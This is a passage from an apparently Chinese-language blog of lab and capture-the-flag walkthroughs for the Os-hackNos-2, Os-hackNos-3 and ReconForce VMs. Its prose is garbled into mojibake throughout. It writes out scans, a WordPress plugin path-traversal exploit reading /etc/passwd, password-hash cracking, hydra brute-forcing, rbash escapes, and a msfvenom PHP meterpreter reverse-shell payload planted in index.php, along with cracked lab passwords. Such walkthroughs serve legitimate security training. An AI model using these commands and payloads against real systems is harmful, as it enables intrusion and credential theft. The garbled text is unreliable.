å³Kaliå¯ä»¥ç”¨EXPè·å–Shellä½†Ubuntuä¸èƒ½åå¼¹Shellç»™Kali æ‰€ä»¥éœ€è¦Windowsç”¨MSFæ¥æ”¶åå¼¹Shell åœ¨EXPçš„Shellä¸­ï¼Œwgetè·å–çš„æ–‡ä»¶æƒé™ä¸º644ä¸”æ‰€æœ‰è€…ä¸ºrootï¼Œå³ä¸èƒ½ç›´æ¥wgetä¸€ä¸ªMeterpreteråé—¨ç¨‹åºå¹¶æ‰§è¡Œ ä½†å¯ä»¥ç”¨wgetè·å–weevelyçš„WebShellï¼Œ644çš„æƒé™ä¸”æ‰€æœ‰è€…ä¸ºrootå¹¶ä¸ä¼šå½±å“WebShellçš„è¿æ¥ï¼Œè€Œä¸”åœ¨WebShellä¸­ï¼Œå¯ä»¥è¿›è¡Œæ–‡ä»¶ä¸Šä¼ å’Œä¸‹è½½ï¼Œwgetæ‰€å¾—çš„æ–‡ä»¶æƒé™ä¸º644ï¼Œæ‰€æœ‰è€…ä¸ºwww-dataï¼Œå³å¯ä»¥ç”¨WebShellè·å–Meterpreteråé—¨ç¨‹åº åœ¨wgetä¸€ä¸ªWebShellä¹‹å‰ï¼Œè¦ä¿®æ”¹æ–‡ä»¶åç¼€å æœåŠ¡å™¨ä¼šæŠŠphpåç¼€çš„æ–‡ä»¶è§£æå¹¶æ‰§è¡Œï¼Œå°±ä¸èƒ½è·å–è¯¥phpæ–‡ä»¶ è€Œä¿®æ”¹æ–‡ä»¶åç¼€åä¹‹åæœåŠ¡å™¨åˆ™æ— æ³•è§£æï¼Œä»è€Œè·å–WebShell åœ¨è·å–ä¹‹åä¿®æ”¹æ–‡ä»¶åç¼€åä¸º.phpï¼Œå¹¶ç§»åŠ¨åˆ°Webç›®å½•ä¸‹ å³å¯è¿æ¥WebShell åˆ‡æ¢ç”¨æˆ·éœ€è¦ä¸€ä¸ªæ ‡å‡†Shell å¯ä»¥åœ¨Meterpreterä¸­è·å– Os-hackNos-2 2020/01/10 23:58:25 ç«¯å£æ‰«æ nmap -sV -Pn -v -T5 -A 192.168.1.104 12345678910111213141516Nmap scan report for 192.168.1.104Host is up (0.00095s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION22&#x2F;tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 94:36:4e:71:6a:83:e2:c1:1e:a9:52:64:45:f6:29:80 (RSA)| 256 b4:ce:5a:c3:3f:40:52:a6:ef:dc:d8:29:f3:2c:b5:d1 (ECDSA)|_ 256 09:6c:17:a1:a3:b4:c7:78:b9:ad:ec:de:8f:64:b1:7b (ED25519)80&#x2F;tcp open http Apache httpd 2.4.29 ((Ubuntu))| http-methods: |_ Supported Methods: GET POST OPTIONS HEAD|_http-server-header: Apache&#x2F;2.4.29 (Ubuntu)|_http-title: Apache2 Ubuntu Default Page: It worksMAC Address: 08:00:27:D8:5B:21 (Oracle VirtualBox virtual NIC)Aggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Netgear ReadyNAS 2100 (RAIDiator 4.2.24) (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Netgear ReadyNAS device (RAIDiator 4.2.21 - 4.2.27) (94%), Linux 2.6.32 - 2.6.35 (94%), Linux 2.6.32 - 3.5 (94%) Webè·¯å¾„æšä¸¾ dirb http://192.168.1.104 -w 123456789---- Scanning URL: http:&#x2F;&#x2F;192.168.1.104&#x2F; ----+ http:&#x2F;&#x2F;192.168.1.104&#x2F;index.html (CODE:200|SIZE:10918) + http:&#x2F;&#x2F;192.168.1.104&#x2F;server-status (CODE:403|SIZE:278) &#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.1.104&#x2F;tsweb&#x2F; ---- Entering directory: http:&#x2F;&#x2F;192.168.1.104&#x2F;tsweb&#x2F; ----+ http:&#x2F;&#x2F;192.168.1.104&#x2F;tsweb&#x2F;index.php (CODE:301|SIZE:0) &#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.1.104&#x2F;tsweb&#x2F;wp-admin&#x2F; &#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.1.104&#x2F;tsweb&#x2F;wp-content&#x2F; æ¼æ´åˆ©ç”¨ WebæœåŠ¡é‡‡ç”¨äº†Wordpressæ¡†æ¶ ä½¿ç”¨wpscané’ˆå¯¹wordpressè¿›è¡Œæ‰«æ wpscan --url http://192.168.1.104/tsweb/ --enumerate u 123456789[i] User(s) Identified:[+] user | Found By: Rss Generator (Passive Detection) | Confirmed By: | Wp Json Api (Aggressive Detection) | - http:&#x2F;&#x2F;192.168.1.104&#x2F;tsweb&#x2F;index.php&#x2F;wp-json&#x2F;wp&#x2F;v2&#x2F;users&#x2F;?per_page&#x3D;100&amp;page&#x3D;1 | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) å‘ç°å­˜åœ¨ç”¨æˆ·user wpscan --url http://192.168.1.104/tsweb/ --enumerate p 1234567891011121314[i] Plugin(s) Identified:[+] gracemedia-media-player | Location: http:&#x2F;&#x2F;192.168.1.104&#x2F;tsweb&#x2F;wp-content&#x2F;plugins&#x2F;gracemedia-media-player&#x2F; | Latest Version: 1.0 (up to date) | Last Updated: 2013-07-21T15:09:00.000Z | | Found By: Urls In Homepage (Passive Detection) | | Version: 1.0 (100% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) | - http:&#x2F;&#x2F;192.168.1.104&#x2F;tsweb&#x2F;wp-content&#x2F;plugins&#x2F;gracemedia-media-player&#x2F;readme.txt | Confirmed By: Readme - ChangeLog Section (Aggressive Detection) | - http:&#x2F;&#x2F;192.168.1.104&#x2F;tsweb&#x2F;wp-content&#x2F;plugins&#x2F;gracemedia-media-player&#x2F;readme.txt å­˜åœ¨æ’ä»¶gracemedia-media-player æœç´¢å¾—åˆ°ç›¸å…³EXP wp-content/plugins/gracemedia-media-player/templates/files/ajax_controller.php?ajaxAction=getIds&amp;cfg=../../../../../../../../../../etc/passwd å¾—åˆ°ä¸¤æ¡é‡è¦ä¿¡æ¯ rohit:x:1000:1000:hackNos:/home/rohit:/bin/bash flag:$1$flag$vqjCxzjtRc7PofLYS2lWf/:1001:1003::/home/flag:/bin/rbash å¯ä»¥ç ´è§£flagè´¦æˆ·çš„å¯†ç  ä½¿ç”¨johnè¿›è¡Œå­—å…¸çˆ†ç ´ 12345echo &#39;$1$flag$vqjCxzjtRc7PofLYS2lWf&#x2F;&#39; &gt; passwdjohn --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlist&#x2F;rockyou.txt --format&#x3D;md5crypt-long passwdjohn --show passwdtopsecret ä½¿ç”¨flagè´¦æˆ·ç™»å…¥ 12ssh flag@192.168.1.104topsecret æƒé™æå‡ è€Œç™»å…¥æ—¶ä½¿ç”¨çš„æ˜¯rbashï¼Œåœ¨è¿›è¡Œæ“ä½œæ—¶ä¼šå¾ˆä¸æ–¹ä¾¿ï¼Œéœ€è¦åˆ‡æ¢åˆ°bash 123python -c &#39;import os; os.system(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;perl -e &#39;exec &quot;&#x2F;bin&#x2F;bash&quot;;&#39;awk &#39;BEGIN &#123;system(&quot;&#x2F;bin&#x2F;bash&quot;)&#125;&#39; ä»¥ä¸Šä¸‰æ¡å‘½ä»¤å‡å¯(ä½†æ˜¯æ›´æ¨èç”¨ä¸‹é¢çš„æ–¹æ³•è·å–TTY) æˆ–è€…ä½¿ç”¨pythonè·å–ä¸€ä¸ªæ”¯æŒå®Œå…¨äº¤äº’çš„TTY(å¦‚æœç›®æ ‡æœºå™¨ä¸Šåªæœ‰python3è€Œæ²¡æœ‰python2ï¼Œåˆ™æ”¹ä¸ºpython3æ‰§è¡Œå³å¯) 1python -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39; å°è¯•ç›´æ¥sudoææƒï¼Œå¤±è´¥ å°è¯•åœ¨ç›®æ ‡æœåŠ¡å™¨å†…æœç´¢ä¿¡æ¯ å‘ç°æ–‡ä»¶/var/backups/passbkp/md5-hash 123cat &#x2F;var&#x2F;backups&#x2F;passbkp&#x2F;md5-hash $1$rohit$01Dl0NQKtgfeL08fGrggi0 å¾—åˆ°rohitè´¦æˆ·çš„å¯†ç  ä½¿ç”¨johnç ´è§£å¯†ç  12345echo &#39;$1$rohit$01Dl0NQKtgfeL08fGrggi0&#39; &gt; passwd2john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlist&#x2F;rockyou.txt --format&#x3D;md5crypt-long passwd2john --show passwd2!%hack41 åˆ‡æ¢åˆ°rohitè´¦æˆ·ï¼Œå¹¶å°è¯•sudoææƒ 123456su rohit!%hack41sudo -i!%hack41iduid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root) æ€»ä½“æ¥çœ‹æ¸—é€éš¾åº¦å¹¶ä¸é«˜ï¼Œä½†æ˜¯è¿™é‡Œæˆ‘æƒ³ç¨å¾®è®°å½•ä¸€äº›å…³äºwpscançš„å†…å®¹ wpscanæ˜¯ä¸€ä¸ªåŸºäºrubyï¼Œé’ˆå¯¹wordpressæ¡†æ¶çš„webæ‰«æå™¨ ä½†æ˜¯ä¹‹å‰kaliä¸Šä¸€ç›´è¿è¡Œä¸äº†wpscanï¼Œä¸€ç›´ä»¥ä¸ºæ˜¯wpscanè½¯ä»¶çš„é—®é¢˜ï¼Œå¤šæ¬¡å¤±è´¥ä¹‹åæ‰å‘ç°æ˜¯rubyçš„é—®é¢˜ å®˜ç½‘æœ‰è¿™ä¹ˆä¸€å¥è¯ (Optional but highly recommended: RVM) ç°åœ¨çœ‹æ¥ä¹Ÿè§‰å¾—ç¡®å®å¦‚æ­¤ æ‰€ä»¥ä¸€ç•ªæŠ˜è…¾ä¹‹åç»ˆäºåœ¨érootç”¨æˆ·ä¸Šå®‰è£…å¥½äº†rvmï¼Œç„¶åæ¢rubyæºï¼Œå®‰è£…ruby2.5.5ï¼Œæ¢gemæºï¼Œå†ç”¨gemå®‰è£…ä¸€éwpscan æœ€åç»ˆå½’æ˜¯èƒ½æ­£å¸¸ä½¿ç”¨wpscanäº† å‚è€ƒèµ„æ–™ rvm rvm wpscan rvm wp Os-hackNos-3 2020/01/19 21:46:32 ç«¯å£æ‰«æ nmap -p 1-65535 -sV -A -v -T 5 -n 192.168.31.39 1234567891011121314151617Nmap scan report for 192.168.31.39Host is up (0.0013s latency).Not shown: 65533 closed portsPORT STATE SERVICE VERSION22&#x2F;tcp open ssh OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 ce:16:a0:18:3f:74:e9:ad:cb:a9:39:90:11:b8:8a:2e (RSA)| 256 9d:0e:a1:a3:1e:2c:4d:00:e8:87:d2:76:8c:be:71:9a (ECDSA)|_ 256 63:b3:75:98:de:c1:89:d9:92:4e:49:31:29:4b:c0:ad (ED25519)80&#x2F;tcp open http Apache httpd 2.4.41 ((Ubuntu))| http-methods: |_ Supported Methods: GET POST OPTIONS HEAD|_http-server-header: Apache&#x2F;2.4.41 (Ubuntu)|_http-title: WebSecMAC Address: 08:00:27:19:3A:EE (Oracle VirtualBox virtual NIC)Aggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Netgear ReadyNAS 2100 (RAIDiator 4.2.24) (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Netgear ReadyNAS device (RAIDiator 4.2.21 - 4.2.27) (94%), Linux 2.6.32 - 2.6.35 (94%), Linux 2.6.32 - 3.5 (94%)No exact OS matches for host (test conditions non-ideal). Webè·¯å¾„æšä¸¾ å°è¯•çˆ†ç ´80ç«¯å£ä¸‹çš„Webè·¯å¾„ æœªå‘ç°æœ‰æ•ˆä¿¡æ¯ åœ¨ä¸»é¡µå¤„æœ‰æç¤º 12find the BugYou need extra WebSec å‘ç°å­˜åœ¨Webè·¯å¾„/websec å†é’ˆå¯¹è¯¥è·¯å¾„è¿›ä¸€æ­¥æ‰«æ dirb http://192.168.31.39/websec/ -w 12345678910111213141516171819202122232425262728293031---- Scanning URL: http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F; ----+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;0 (CODE:200|SIZE:4346) + http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;01 (CODE:200|SIZE:4644) + http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;1 (CODE:200|SIZE:4644) + http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;1x1 (CODE:200|SIZE:4644) + http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;about (CODE:200|SIZE:3754) + http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;About (CODE:200|SIZE:3754) + http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;admin (CODE:200|SIZE:1591) + http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;api (CODE:200|SIZE:0) + http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;assets (CODE:301|SIZE:333) + http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;author (CODE:200|SIZE:4208) + http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;blog (CODE:200|SIZE:4346) + http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;category (CODE:200|SIZE:4366) + http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;cm (CODE:500|SIZE:0) + http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;feed (CODE:200|SIZE:765) + http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;fm (CODE:200|SIZE:0) + http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;index (CODE:200|SIZE:4346) + http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;Index (CODE:200|SIZE:4346) + http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;lib (CODE:301|SIZE:327) + http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;log (CODE:301|SIZE:327) + http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;login (CODE:200|SIZE:1591) + http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;robots.txt (CODE:200|SIZE:65) + http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;search (CODE:200|SIZE:4346) + http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;Search (CODE:200|SIZE:4346) + http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;sites (CODE:301|SIZE:331) + http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;src (CODE:301|SIZE:327) + http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;tag (CODE:200|SIZE:4361) + http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;tags (CODE:200|SIZE:3554) + http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;test (CODE:301|SIZE:329) + http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;themes (CODE:301|SIZE:333) + http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;tmp (CODE:301|SIZE:327) æ¼æ´åˆ©ç”¨ WEBæœåŠ¡å­˜åœ¨ç™»å½•é¡µé¢ ä¸»é¡µä¸­å·²ç»ç»™å‡ºäº†ä¸€ä¸ªè”ç³»é‚®ç®±:contact@hacknos.com å¯ä»¥åˆ©ç”¨hydraè¿›è¡Œå£ä»¤æšä¸¾ ä½¿ç”¨top6000å¼±å£ä»¤è¿›è¡Œæšä¸¾ 1hydra -I -l contact@hacknos.com -P FuzzDicts-master&#x2F;passwordDict&#x2F;top6000.txt -vV -f 192.168.31.39 http-post-form &quot;&#x2F;websec&#x2F;login:username&#x3D;^USER^&amp;password&#x3D;^PASS^:Wrong&quot; æœªè·å¾—è´¦æˆ·å£ä»¤ ä½¿ç”¨cewlè·å–é¡µé¢å†…å®¹æ¥ä½œä¸ºå£ä»¤ cewl http://192.168.31.39/websec -w pass ä½¿ç”¨ç½‘ç«™å†…å®¹ä½œæ¥æšä¸¾è´¦æˆ·å£ä»¤ 123hydra -I -l contact@hacknos.com -P pass -vV -f 192.168.31.39 http-post-form &quot;&#x2F;websec&#x2F;login:username&#x3D;^USER^&amp;password&#x3D;^PASS^:Wrong&quot;[80][http-post-form] host: 192.168.31.39 login: contact@hacknos.com password: Securityx å¾—åˆ°Webè´¦æˆ·æƒé™ æƒé™æå‡ Webé¡µé¢ä¸­å¯ä»¥åœ¨å·¦ä¾§èœå•ä¸­é€‰æ‹©Content &gt; File Manageræ¥ç®¡ç†æ–‡ä»¶ å°è¯•å†™å…¥Webshellï¼Œä½†æ˜¯æ— æ³•è®¿é—®åˆ°æ–‡ä»¶ å°è¯•ä½¿ç”¨msfvenomåˆ›å»ºåŸºäºphpçš„meterpreteråé—¨ï¼Œå†å†™å…¥åˆ°index.phpä¸­ 12msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.31.10 LPORT&#x3D;2020 -f raw &gt; shell.phpcat shell.php å°†å†…å®¹å¤åˆ¶åˆ°index.phpæ–‡ä»¶æœ« åœ¨MSFä¸­æ¥æ”¶Meterpreter 12345use exploit&#x2F;multi&#x2F;handlerset payload php&#x2F;meterpreter&#x2F;reverse_tcpset LHOST 192.168.31.10set LPORT 2020run åœ¨Meterpreterçš„shellä¸­åˆ‡æ¢è‡³äº¤äº’shell 123shellid uid&#x3D;33(www-data) gid&#x3D;33(www-data) groups&#x3D;33(www-data) æŸ¥çœ‹/etc/passwdæ–‡ä»¶ 123456789101112131415161718192021222324252627282930313233343536cat &#x2F;etc&#x2F;passwdroot:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bashdaemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologinbin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologinsys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologinsync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;syncgames:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologinman:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologinlp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologinmail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologinnews:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologinuucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologinproxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologinwww-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologinbackup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologinlist:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologinirc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologingnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologinnobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologinsystemd-timesync:x:100:102:systemd Time Synchronization,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologinsystemd-network:x:101:103:systemd Network Management,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologinsystemd-resolve:x:102:104:systemd Resolver,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologinmessagebus:x:103:106::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologinsyslog:x:104:110::&#x2F;home&#x2F;syslog:&#x2F;usr&#x2F;sbin&#x2F;nologin_apt:x:105:65534::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologinuuidd:x:106:111::&#x2F;run&#x2F;uuidd:&#x2F;usr&#x2F;sbin&#x2F;nologintcpdump:x:107:112::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologinlandscape:x:108:114::&#x2F;var&#x2F;lib&#x2F;landscape:&#x2F;usr&#x2F;sbin&#x2F;nologinpollinate:x:109:1::&#x2F;var&#x2F;cache&#x2F;pollinate:&#x2F;bin&#x2F;falsesshd:x:110:65534::&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologinsystemd-coredump:x:999:999:systemd Core Dumper:&#x2F;:&#x2F;usr&#x2F;sbin&#x2F;nologinblackdevil:x:1000:118:hackNos:&#x2F;home&#x2F;blackdevil:&#x2F;bin&#x2F;bashlxd:x:998:100::&#x2F;var&#x2F;snap&#x2F;lxd&#x2F;common&#x2F;lxd:&#x2F;bin&#x2F;falsemysql:x:111:116:MySQL Server,,,:&#x2F;nonexistent:&#x2F;bin&#x2F;falsednsmasq:x:112:65534:dnsmasq,,,:&#x2F;var&#x2F;lib&#x2F;misc:&#x2F;usr&#x2F;sbin&#x2F;nologin å‘ç°æ–‡ä»¶/var/local/database 12345678910cat &#x2F;var&#x2F;local&#x2F;databaseExpensesSoftware Licenses,$2.78Maintenance,$68.87Mortgage Interest,$70.35Advertising,$9.78Phone,$406.80Insurance,$9.04Opss;fackespreadsheet å¾—åˆ°æç¤ºfackespreadsheet åœ¨æŸä¸ªä¸å­˜åœ¨çš„ç½‘ç«™ä¸Šæœç´¢å¾—åˆ°åœ¨çº¿è§£å¯†å·¥å…· http://www.spammimic.com/spreadsheet.php?action=decode è§£å¯†å¾—Security@x@ å°è¯•ä»¥æ­¤ä½œä¸ºå£ä»¤ç™»å…¥blackdevilè´¦æˆ· 1234ssh blackdevil@192.168.31.39Security@x@id uid&#x3D;1000(blackdevil) gid&#x3D;118(docker) groups&#x3D;118(docker),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lxd) å°è¯•sudoææƒ 1234sudo -iSecurity@x@id uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root) hydraåœ¨ç”¨äºçˆ†ç ´Webç™»å½•æ—¶éœ€è¦è°ƒæ•´çš„å‚æ•°æœ‰ç‚¹å¤š httpè¯·æ±‚ç±»å‹ æ•°æ®çš„å‚æ•°å ç™»å½•æˆåŠŸ/å¤±è´¥æ—¶æ‰€å›åº”çš„ä¿¡æ¯ ç”±äºç™»é™†å¤±è´¥ä¼šå›åº”Wrong email or password æ‰€ä»¥å€Ÿä»¥è¯¥ä¿¡æ¯æ¥åˆ¤æ–­æ˜¯å¦ç™»å…¥æˆåŠŸ è·å–Webshellæ—¶æœ‰äº›éº»çƒ¦ï¼Œä¸€å¼€å§‹ä»¥ä¸ºæ˜¯ä¼ ç»Ÿçš„phpä¸€å¥è¯ä¸Šä¼ ï¼Œç»“æœå‘ç°ä¸Šä¼ çš„æ–‡ä»¶éƒ½ä¸èƒ½æ‰“å¼€ï¼Œå±¡æ¬¡å°è¯•åè½¬è€Œä½¿ç”¨Meterpreterè·å–Shell è§£å¯†è¿‡ç¨‹çš„è„‘æ´è¾ƒå¤§(æ„Ÿè§‰åƒæ˜¯ç©CTFçš„å¤å…¸å¯†ç â€¦)ï¼Œå–„ç”¨æœç´¢å¼•æ“æ€»å½’æ˜¯ä»¶å¥½äº‹ å‚è€ƒèµ„æ–™ WP hydra ReconForce 2020/02/02 20:17:42 ç«¯å£æ‰«æ nmap -p 1-65535 -sV -A -v -T 5 -n 192.168.31.109 1234567891011121314151617181920212223242526272829303132Nmap scan report for 192.168.31.109Host is up (0.00063s latency).Not shown: 65532 closed portsPORT STATE SERVICE VERSION21&#x2F;tcp open ftp vsftpd 2.0.8 or later|_ftp-anon: Anonymous FTP login allowed (FTP code 230)| ftp-syst: | STAT: | FTP server status:| Connected to ::ffff:192.168.31.10| Logged in as ftp| TYPE: ASCII| No session bandwidth limit| Session timeout in seconds is 300| Control connection is plain text| Data connections will be plain text| At session startup, client count was 5| vsFTPd 3.0.3 - secure, fast, stable|_End of status22&#x2F;tcp open ssh OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 6f:96:94:65:72:80:08:93:23:90:20:bc:76:df:b8:ec (RSA)| 256 6f:bb:49:1a:a9:b6:e5:00:84:19:a0:e4:2b:c4:57:c4 (ECDSA)|_ 256 ce:3d:94:05:f4:a6:82:c4:7f:3f:ba:37:1d:f6:23:b0 (ED25519)80&#x2F;tcp open http Apache httpd 2.4.41 ((Ubuntu))| http-methods: |_ Supported Methods: GET POST OPTIONS HEAD|_http-server-header: Apache&#x2F;2.4.41 (Ubuntu)|_http-title: Recon_WebMAC Address: 08:00:27:83:C2:54 (Oracle VirtualBox virtual NIC)Aggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Netgear ReadyNAS 2100 (RAIDiator 4.2.24) (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Netgear ReadyNAS device (RAIDiator 4.2.21 - 4.2.27) (94%), Linux 2.6.32 - 2.6.35 (94%), Linux 2.6.32 - 3.5 (94%)No exact OS matches for host (test conditions non-ideal). Webè·¯å¾„æšä¸¾ å°è¯•çˆ†ç ´80ç«¯å£ä¸‹çš„Webè·¯å¾„ æœªå‘ç°æœ‰æ•ˆä¿¡æ¯ åœ¨ä¸»é¡µå¤„å­˜åœ¨ä¸€ä¸ªé“¾æ¥å¯¼å‘/5ecure/è·¯å¾„ å­˜åœ¨Basicè®¤è¯ï¼Œè€Œä¸”é™„å¸¦ä¸€ä¸ªæç¤ºä¿¡æ¯Recon Security æ¼æ´åˆ©ç”¨ FTPæœåŠ¡å…è®¸åŒ¿åç™»å½• 12ftp 192.168.31.109anonymous åŒ¿åç™»å…¥ä¹‹åå‘ç°ä¸èƒ½è¿›è¡Œè¿›ä¸€æ­¥çš„æ“ä½œ å‘ç°Bannerä¸ºSecure@hackNos ä½¿ç”¨cewlç”Ÿæˆå­—å…¸ cewl http://192.168.31.109/ &gt;&gt; data æ·»åŠ ä¸€äº›å¸¸ç”¨è¯ä»¥åŠè·å–åˆ°çš„ä¸€äº›ä¿¡æ¯ 123456echo &quot;root&quot; &gt;&gt; dataecho &quot;admin&quot; &gt;&gt; dataecho &quot;Recon Security&quot; &gt;&gt; dataecho &quot;Secure@hackNos&quot; &gt;&gt; dataecho &quot;5ecure&quot; &gt;&gt; dataecho &quot;&quot; &gt;&gt; data Basicè®¤è¯æ˜¯åŸºäºGetè¯·æ±‚è¿›è¡Œçš„ï¼Œéœ€è¦é™„åŠ çš„ä¸€ä¸ªHeadâ€“Authorizationï¼Œè€Œå…¶å†…å®¹ä¸ºBasic xxxxxxxxï¼Œå…¶ä¸­xxxxxxxxä¸ºuser:passè¿›è¡Œbase64ç¼–ç ä¹‹åçš„ç»“æœ ä½¿ç”¨pythonè„šæœ¬è½¬å˜ä¸ºç›¸åº”çš„æ ¼å¼ 12345678910111213141516171819202122#test.pyimport base64raw &#x3D; [ &#39;Recon&#39;, &#39;Web&#39;, &#39;Home&#39;, &#39;Service&#39;, &#39;Blog&#39;, &#39;hackNos&#39;, &#39;TroubleShoot&#39;, &#39;Security&#39;, &#39;Recon Security&#39;, &#39;Secure&#39;, &#39;root&#39;, &#39;5ecure&#39;, &#39;admin&#39;, &#39;Secure@hackNos&#39;, &#39;Security@hackNos&#39;, &#39;&#39;]for i in raw: for j in raw: print base64.b64encode(j + &#39;:&#39; + i) ./test.py &gt; b64.dir ç„¶ååœ¨Burpä¸­ä½¿ç”¨ç”Ÿæˆçš„å­—å…¸è¿›è¡Œç ´è§£ åœ¨çˆ†ç ´çš„æ—¶å€™é‡åˆ°äº†é—®é¢˜ï¼Œæ²¡æœ‰çˆ†ç ´å‡ºæ¥è´¦æˆ·ï¼Œæ— å¥ˆä¹‹ä¸‹åªå¥½åœ¨ç½‘ä¸Šçœ‹çœ‹å…¶ä»–å¤§ç¥çš„æ€è·¯ï¼Œå‘ç°è²Œä¼¼ä½œè€…æ˜¯æƒ³åœ¨FTP Banneré‡Œå†™ä¸ŠSecurity@hackNosä½†å®é™…å†™æˆäº†Secure@hackNos ä¿®æ”¹ä¸€ä¸‹è„šæœ¬é‡Œé¢çš„rawæ•°ç»„ä¹‹åå‘ç°çˆ†ç ´æˆåŠŸäº† è´¦æˆ·ä¸ºadmin:Security@hackNos 